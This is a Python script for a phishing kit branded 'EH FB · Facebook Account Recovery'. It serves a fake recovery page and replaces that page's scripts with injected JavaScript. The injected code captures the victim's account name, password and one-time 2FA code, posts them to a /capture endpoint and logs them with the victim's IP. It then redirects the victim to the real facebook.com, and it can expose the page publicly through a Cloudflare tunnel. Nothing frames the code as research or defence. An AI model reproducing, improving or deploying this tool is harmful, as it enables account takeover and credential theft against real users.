import subprocess
import sys
import os
import shutil
import tempfile
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote_plus
from datetime import datetime

try:
    import colorama
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama", "-q"])
    import colorama

from colorama import Fore, Back, Style, init
init(autoreset=True)

# ── Palette ──────────────────────────────────────────────────────
C_RED     = Fore.RED
C_CYAN    = Fore.CYAN
C_GREEN   = Fore.GREEN
C_YELLOW  = Fore.YELLOW
C_WHITE   = Fore.WHITE
C_MAGENTA = Fore.MAGENTA
C_BLUE    = Fore.BLUE
C_DIM     = Style.DIM
C_BRIGHT  = Style.BRIGHT
C_RESET   = Style.RESET_ALL

WIDTH = 64

# ── Dividers ─────────────────────────────────────────────────────
DLINE  = C_GREEN  + C_BRIGHT + "═" * WIDTH + C_RESET
DLINE2 = C_GREEN  + C_DIM   + "─" * WIDTH + C_RESET
SLINE  = C_YELLOW + C_DIM   + "·" * WIDTH + C_RESET

BANNER = r"""
███████╗██╗  ██╗    ███████╗██████╗ 
██╔════╝██║  ██║    ██╔════╝██╔══██╗
█████╗  ███████║    █████╗  ██████╔╝
██╔══╝  ██╔══██║    ██╔══╝  ██╔══██╗
███████╗██║  ██║    ██║     ██████╔╝
╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═════╝ 
"""

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
INDEX_SRC  = os.path.join(SCRIPT_DIR, "index.html")

captured_log = []
log_lock     = threading.Lock()


# ── Helpers ───────────────────────────────────────────────────────
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def center(text, color="", width=WIDTH):
    import re
    clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
    pad   = max((width - len(clean)) // 2, 0)
    return " " * pad + color + text + C_RESET


def status(msg, kind="info"):
    icons = {
        "info": C_CYAN   + C_BRIGHT + " ◆ ",
        "ok":   C_GREEN  + C_BRIGHT + " ✔ ",
        "err":  C_RED    + C_BRIGHT + " ✘ ",
        "warn": C_YELLOW + C_BRIGHT + " ⚠ ",
    }
    colors = {
        "info": C_CYAN,
        "ok":   C_GREEN,
        "err":  C_RED,
        "warn": C_YELLOW,
    }
    ic = icons.get(kind, icons["info"])
    vc = colors.get(kind, C_WHITE)
    return f"  {ic}{C_RESET}  {vc}{msg}{C_RESET}"


def prompt_input(label):
    return input(f"\n  {C_GREEN}{C_BRIGHT}❯{C_RESET}  {C_WHITE}{label}{C_RESET}  {C_GREEN}{C_DIM}")


def separator(label=""):
    if label:
        pad  = (WIDTH - len(label) - 6) // 2
        line = (C_GREEN + C_DIM + "─" * pad
                + C_RESET + "  " + C_GREEN + C_BRIGHT + label + C_RESET
                + "  " + C_GREEN + C_DIM + "─" * pad + C_RESET)
        print("\n" + line + "\n")
    else:
        print(DLINE2)


def pause():
    print()
    input(f"  {C_DIM}Press ENTER to return to menu...{C_RESET}")


def cleanup(path):
    try:
        shutil.rmtree(path, ignore_errors=True)
    except Exception:
        pass


def is_port_free(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("127.0.0.1", port))
            return True
        except OSError:
            return False


def find_free_port(start=8080, end=9000):
    for p in range(start, end + 1):
        if is_port_free(p):
            return p
    return None


def get_port():
    print()
    while True:
        raw = prompt_input("Port  [default: auto]  ❯").strip()
        print(C_RESET, end="")
        if raw == "":
            port = find_free_port()
            if port is None:
                print(status("No free port found in 8080-9000.", "err"))
                continue
            print(status(f"Auto port  →  {C_GREEN}{C_BRIGHT}{port}", "ok"))
            return port
        if not (raw.isdigit() and 1 <= int(raw) <= 65535):
            print(status("Enter a valid port (1-65535).", "err"))
            continue
        port = int(raw)
        if is_port_free(port):
            return port
        print(status(f"Port {port} is already in use.", "err"))
        alt = find_free_port(port + 1)
        if alt:
            confirm = prompt_input(f"Use port {alt} instead? [Y/n]  ❯").strip().lower()
            print(C_RESET, end="")
            if confirm in ("", "y", "yes"):
                print(status(f"Switched  →  {C_GREEN}{C_BRIGHT}{alt}", "ok"))
                return alt
        else:
            print(status("No free port found nearby.", "err"))


def prepare_serve_dir():
    if not os.path.isfile(INDEX_SRC):
        print(status(f"index.html not found  →  {INDEX_SRC}", "err"))
        return None
    tmp = tempfile.mkdtemp(prefix="ehphis_")
    shutil.copy2(INDEX_SRC, os.path.join(tmp, "index.html"))
    return tmp


# ── Capture Display ───────────────────────────────────────────────
def print_capture(data, client_ip, entry_num, label):
    now = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")

    # field color mapping
    field_colors = {
        "account":  C_CYAN   + C_BRIGHT,
        "password": C_GREEN  + C_BRIGHT,
        "otp":      C_YELLOW + C_BRIGHT,
    }

    print()
    print(DLINE)
    print(center(f"  ★  {label}  ·  CAPTURE #{entry_num}  ★  ", C_GREEN + C_BRIGHT))
    print(DLINE)
    print()

    # time + ip row
    time_str = f"  {C_DIM}TIME{C_RESET}   {C_WHITE}{now}{C_RESET}"
    ip_str   = f"   {C_DIM}FROM{C_RESET}   {C_YELLOW}{C_BRIGHT}{client_ip}{C_RESET}"
    print(time_str + ip_str)
    print()
    print(DLINE2)
    print()

    for key, val in data.items():
        key_lower  = key.lower()
        label_disp = key.upper()
        val_color  = field_colors.get(key_lower, C_WHITE + C_BRIGHT)
        val_disp   = val if val.strip() else C_DIM + "(empty)" + C_RESET

        # box style row
        print(f"  {C_GREEN}│{C_RESET}  {C_DIM}{C_WHITE}{label_disp:<12}{C_RESET}  "
              f"{C_GREEN}│{C_RESET}  {val_color}{val_disp}{C_RESET}")
        print(f"  {C_GREEN}│{C_RESET}{'─'*60}{C_GREEN}│{C_RESET}" if False else "")

    print()
    print(DLINE)
    sys.stdout.flush()


# ── Injected JS ───────────────────────────────────────────────────
def get_inject_js():
    js = """
<script>
(function(){

  var form = document.getElementById('recoveryForm');
  if(form){
    form.addEventListener('submit', function(e){
      e.preventDefault();
      var account  = (document.getElementById('account')  || {}).value || '';
      var password = (document.getElementById('password') || {}).value || '';
      var body = 'account=' + encodeURIComponent(account)
               + '&password=' + encodeURIComponent(password);
      fetch('/capture?t=page1', {
        method : 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body   : body
      }).then(function(){
        document.body.classList.add('show-page2');
        setTimeout(function(){
          var c = document.getElementById('code');
          if(c) c.focus();
        }, 80);
      }).catch(function(){
        document.body.classList.add('show-page2');
      });
    });
  }

  var p2btn = document.getElementById('page2Next');
  if(p2btn){
    p2btn.addEventListener('click', function(e){
      e.preventDefault();
      var code = (document.getElementById('code') || {}).value || '';
      fetch('/capture?t=page2', {
        method : 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body   : 'otp=' + encodeURIComponent(code)
      }).then(function(){
        window.location.href = 'https://www.facebook.com/';
      }).catch(function(){
        window.location.href = 'https://www.facebook.com/';
      });
    });
  }

  var forgot = document.getElementById('forgot');
  if(forgot) forgot.addEventListener('click', function(){ });

  var resend = document.getElementById('resendLink');
  if(resend) resend.addEventListener('click', function(e){ e.preventDefault(); });

  var another = document.getElementById('tryAnother');
  if(another) another.addEventListener('click', function(e){ e.preventDefault(); });

  var codeInput = document.getElementById('code');
  if(codeInput){
    codeInput.addEventListener('input', function(){
      this.value = this.value.replace(/\\D/g,'').slice(0,6);
      if(p2btn) p2btn.classList.toggle('active', this.value.length > 0);
    });
    codeInput.addEventListener('keydown', function(e){
      if(e.key === 'Enter'){ e.preventDefault(); if(p2btn && codeInput.value) p2btn.click(); }
    });
  }

})();
</script>
"""
    return js.encode("utf-8")


def patch_html(raw):
    import re
    cleaned = re.sub(rb'<script[\s\S]*?</script>', b'', raw, flags=re.IGNORECASE)
    inject  = get_inject_js()
    return cleaned.replace(b'</body>', inject + b'\n</body>')


# ── HTTP Handler ──────────────────────────────────────────────────
class PhishHandler(BaseHTTPRequestHandler):

    serve_dir = ""

    def log_message(self, format, *args):
        pass

    def send_html(self, content, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(content)

    def do_GET(self):
        path = self.path.split("?")[0].rstrip("/") or "/"
        if path in ("/", "/index.html"):
            fp = os.path.join(self.serve_dir, "index.html")
            if os.path.isfile(fp):
                with open(fp, "rb") as f:
                    raw = f.read()
                self.send_html(patch_html(raw))
            else:
                self.send_html(b"index.html not found", 404)
            return
        self.send_html(b"404", 404)

    def do_POST(self):
        if "/capture" not in self.path:
            self.send_response(404)
            self.end_headers()
            return

        qstring = self.path.split("?", 1)[1] if "?" in self.path else ""
        from urllib.parse import parse_qs as pqs
        params  = pqs(qstring)
        ptype   = params.get("t", ["unknown"])[0]
        label   = "PAGE 1  ·  EMAIL / PASSWORD" if ptype == "page1" else "PAGE 2  ·  OTP CODE"

        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace")
        parsed = parse_qs(body, keep_blank_values=True)
        flat   = {k: unquote_plus(v[0]) for k, v in parsed.items()}
        ip     = self.client_address[0]

        with log_lock:
            captured_log.append({"ip": ip, "data": flat, "type": ptype})
            num = len(captured_log)

        print_capture(flat, ip, num, label)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")


def make_handler(serve_dir):
    class BoundHandler(PhishHandler):
        pass
    BoundHandler.serve_dir = serve_dir
    return BoundHandler


def launch_server(port, serve_dir):
    handler = make_handler(serve_dir)
    server  = HTTPServer(("0.0.0.0", port), handler)
    return server


# ── Banner & Menu ─────────────────────────────────────────────────
def print_banner():
    clear()
    print()
    print(DLINE)
    for line in BANNER.strip("\n").split("\n"):
        print(center(line, C_GREEN + C_BRIGHT))
    print()
    print(center("[ EH FB  ·  Facebook Account Recovery ]", C_GREEN + C_DIM))
    print()
    print(center("Developer  ·  EH MUNNA", C_YELLOW + C_BRIGHT))
    print()
    print(DLINE)


def print_menu():
    print()
    W = 54
    border = C_GREEN + C_DIM
    num_c  = C_GREEN + C_BRIGHT
    txt_c  = C_WHITE + C_BRIGHT
    desc_c = C_DIM   + C_WHITE

    print(f"  {border}╔{'═'*W}╗{C_RESET}")
    print(f"  {border}║{C_RESET}{'':^{W}}{border}║{C_RESET}")
    print(f"  {border}║{C_RESET}  {num_c}1{C_RESET}   {txt_c}Localhost{C_RESET}       {desc_c}Serve & capture locally          {border}║{C_RESET}")
    print(f"  {border}║{C_RESET}{'':^{W}}{border}║{C_RESET}")
    print(f"  {border}║{C_RESET}  {num_c}2{C_RESET}   {txt_c}Cloudflared{C_RESET}     {desc_c}Expose via Cloudflare tunnel     {border}║{C_RESET}")
    print(f"  {border}║{C_RESET}{'':^{W}}{border}║{C_RESET}")
    print(f"  {border}║{C_RESET}  {C_RED + C_BRIGHT}0{C_RESET}   {txt_c}Exit{C_RESET}            {desc_c}Quit the tool                    {border}║{C_RESET}")
    print(f"  {border}║{C_RESET}{'':^{W}}{border}║{C_RESET}")
    print(f"  {border}╚{'═'*W}╝{C_RESET}")
    print()


def run_localhost(port):
    separator("LOCALHOST MODE")
    serve_dir = prepare_serve_dir()
    if serve_dir is None:
        pause()
        return

    print(f"  {C_DIM}FILE   {C_RESET}  {C_WHITE}index.html{C_RESET}")
    print(f"  {C_DIM}URL    {C_RESET}  {C_GREEN}{C_BRIGHT}http://127.0.0.1:{port}{C_RESET}")
    print(f"  {C_DIM}STOP   {C_RESET}  {C_YELLOW}CTRL + C{C_RESET}")
    print()
    print(DLINE2)
    print()
    print(status("Server live  ·  Waiting for submissions...", "ok"))
    print()

    server = launch_server(port, serve_dir)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print()
        print(status("Server stopped.", "warn"))
    finally:
        server.server_close()
        cleanup(serve_dir)


def run_cloudflared(port):
    separator("CLOUDFLARED MODE")
    check = subprocess.run(["cloudflared", "--version"], capture_output=True)
    if check.returncode != 0:
        print(status("cloudflared not found on this system.", "err"))
        print()
        print(f"  {C_DIM}INSTALL  {C_RESET}  {C_CYAN}https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/{C_RESET}")
        print()
        pause()
        return

    serve_dir = prepare_serve_dir()
    if serve_dir is None:
        pause()
        return

    print(f"  {C_DIM}FILE   {C_RESET}  {C_WHITE}index.html{C_RESET}")
    print(f"  {C_DIM}TARGET {C_RESET}  {C_GREEN}{C_BRIGHT}http://localhost:{port}{C_RESET}")
    print(f"  {C_DIM}STOP   {C_RESET}  {C_YELLOW}CTRL + C{C_RESET}")
    print()
    print(DLINE2)
    print()

    server = launch_server(port, serve_dir)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(status(f"HTTP server running on port {port}", "ok"))
    print(status("Starting Cloudflare tunnel...", "info"))
    print()

    try:
        subprocess.run(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
            check=True
        )
    except KeyboardInterrupt:
        print()
        print(status("Tunnel closed.", "warn"))
    except Exception as e:
        print(status(f"Error: {e}", "err"))
    finally:
        server.shutdown()
        server.server_close()
        cleanup(serve_dir)
        print(status("Server stopped.", "warn"))


def main():
    while True:
        print_banner()
        print_menu()
        raw = prompt_input("Select option  ❯").strip()
        print(C_RESET, end="")
        if raw == "1":
            port = get_port()
            run_localhost(port)
            pause()
        elif raw == "2":
            port = get_port()
            run_cloudflared(port)
            pause()
        elif raw == "0":
            print()
            print(status("Exiting EH FB.  Stay sharp.", "warn"))
            print()
            sys.exit(0)
        else:
            print()
            print(status("Invalid option.  Use 1, 2, or 0.", "err"))
            pause()


if __name__ == "__main__":
    main()
